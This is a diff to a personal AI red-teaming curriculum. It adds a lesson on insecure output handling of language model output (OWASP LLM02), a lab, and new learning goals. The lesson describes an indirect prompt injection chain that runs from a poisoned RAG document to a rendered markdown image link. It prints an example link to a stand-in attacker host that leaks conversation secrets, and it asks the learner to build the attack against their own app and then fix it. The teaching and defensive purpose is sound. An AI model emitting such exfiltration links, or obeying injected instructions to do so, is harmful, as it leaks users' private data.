@@ -209,7 +209,7 @@ For each lab:
 |Week|Focus                                 |Resource                    |
 |----|--------------------------------------|----------------------------|
 |25  |**RAG & Agent security**              |**AI Engineering Ch 6 + Dursey Ch 7 + LangChain hands-on**|
-|26  |**ML Supply Chain + Production**      |**AI Engineering Ch 5, 7, 10 + hands-on exploits**|
+|26  |**Prompt Eng + Output Handling (LLM02) + Supply Chain**|**AI Engineering Ch 5, 7, 10 + OWASP LLM02 + hands-on exploits**|
 
 **Week 25: RAG & Agent Security - CRITICAL**
 
@@ -329,9 +329,32 @@ This is THE chapter for AI red teaming:
   - Defense strategies and why they often fail
 - **Techniques for Improving Outputs:** Chain-of-thought (and how to exploit it)
 
-**Friday (2 hours): Catch-up / HTB Academy**
-- Finish any remaining HTB modules from Weeks 23-24
-- Or catch up on Week 25 RAG attacks if needed
+**Friday (2 hours): Insecure Output Handling (OWASP LLM02)**
+
+Prompt injection is what goes *into* the model. This is what happens to what comes *out* — and it's the other half of the same attack chain. An injected prompt that produces a payload only matters because something downstream renders or executes that payload without treating it as untrusted.
+
+**The core principle:** LLM output is untrusted input to whatever consumes it. Every consumer is a sink.
+
+|Sink                        |Vulnerability                                   |
+|----------------------------|------------------------------------------------|
+|Browser / web UI            |XSS via model-generated HTML, JS, or markdown links|
+|Markdown renderer           |Image tags and links that exfiltrate data on render|
+|Shell / subprocess          |Command injection from generated commands       |
+|SQL layer                   |Injection from generated queries                 |
+|Downstream LLM or tool call |Chained injection into the next component        |
+
+**Why the markdown case matters most:** a model persuaded to emit `![](https://attacker/?d=<secrets>)` exfiltrates conversation contents the moment the client renders it — no user click required. This is the standard end-to-end indirect prompt injection chain: poisoned source → injected instruction → attacker-controlled output → automatic rendering.
+
+**Why the usual defenses don't transfer:** you can't parameterize natural-language output or allowlist model responses. The mitigation lives at each sink — contextual output encoding, sandboxed/text-only rendering, stripping or safe-listing markdown, and validating tool-call arguments before execution. That's an architecture judgment, which is your lens.
+
+**Do (2 hours):**
+1. Take the RAG app you built in Week 25. Poison a source document so the model emits a markdown image tag pointing at a URL you control, and confirm the request fires when the client renders the response (check your listener's logs). That's data exfiltration via LLM02.
+2. On the agent, get model output to pass a malicious argument into a tool call with no validation.
+3. Fix both: text-only rendering / markdown sanitization for the UI, argument validation for the tool. Document the attack and the fix in Obsidian.
+
+**Reference:** [OWASP LLM02: Insecure Output Handling](https://genai.owasp.org/llmrisk/llm02-insecure-output-handling/)
+
+**If HTB modules from Weeks 23-24 are unfinished, fold them into the weekend instead.**
 
 **Weekend (6 hours): Apply Prompt Engineering to Attacks**
 - Revisit your RAG app and agent from Week 25
@@ -537,6 +560,7 @@ Before moving to Track 9: Python Core, you should be able to:
 - Explain foundation model internals (training, scaling, sampling)
 - Describe RAG architecture and its attack surfaces
 - Explain how LLM agents work and their vulnerabilities
+- Explain insecure output handling (LLM02): why model output is untrusted input to every downstream sink, and where it gets encoded/validated
 - Understand ML supply chain risks
 - Design evaluation pipelines for measuring attack effectiveness
 
@@ -545,6 +569,7 @@ Before moving to Track 9: Python Core, you should be able to:
 - Run Garak scans against LLM targets (automated vulnerability discovery)
 - Direct Claude Code to build prompt injection exploits
 - Direct Claude Code to build RAG applications + attack them
+- Exploit insecure output handling (markdown exfil / XSS / unvalidated tool args) end-to-end and remediate it at the sink
 - Direct Claude Code to build model verification tools
 - Build PyRIT attack scripts (multi-turn adaptive chains)
 - Solve HackAPrompt and Crucible challenges
